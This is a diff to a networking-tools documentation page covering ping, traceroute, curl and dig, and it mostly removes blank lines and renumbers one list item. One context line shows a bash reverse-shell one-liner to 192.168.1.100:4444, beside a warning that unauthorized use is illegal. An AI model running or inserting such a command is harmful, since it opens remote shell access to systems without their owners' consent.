@@ -173,7 +173,6 @@ ping -c 1 -t 1 8.8.8.8  # Will fail with "Time to live exceeded"
 `nc -zv` or `curl` to test TCP connectivity as an alternative. ICMP blocking is common in cloud
 Environments (AWS security groups do not allow ICMP by default).
 
-
 ## traceroute / traceroute6
 
 `traceroute` discovers the path packets take to reach a destination by sending packets with
@@ -509,7 +508,6 @@ bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 </aside>
 <aside class="starlight-aside starlight-aside--danger">
 Using them without authorization is illegal.
-
 
 ## curl
 
@@ -1059,7 +1057,7 @@ ipconfig /flushdns
 dig +trace example.com
 ```
 
-8. **Trusting tool output blindly.** Always verify with multiple tools. If `ping` fails but `curl`
+1. **Trusting tool output blindly.** Always verify with multiple tools. If `ping` fails but `curl`
    succeeds, ICMP is filtered. If `dig` returns an IP but `curl` fails, there may be a firewall
    blocking TCP. Cross-reference symptoms across tools and layers to isolate the root cause.
 
@@ -1083,7 +1081,6 @@ for mastery of this topic.
 
 Worked examples demonstrating the application of key concepts are covered in the detailed sub-pages
 linked above.
-
 
 </aside>
 ## Intuition
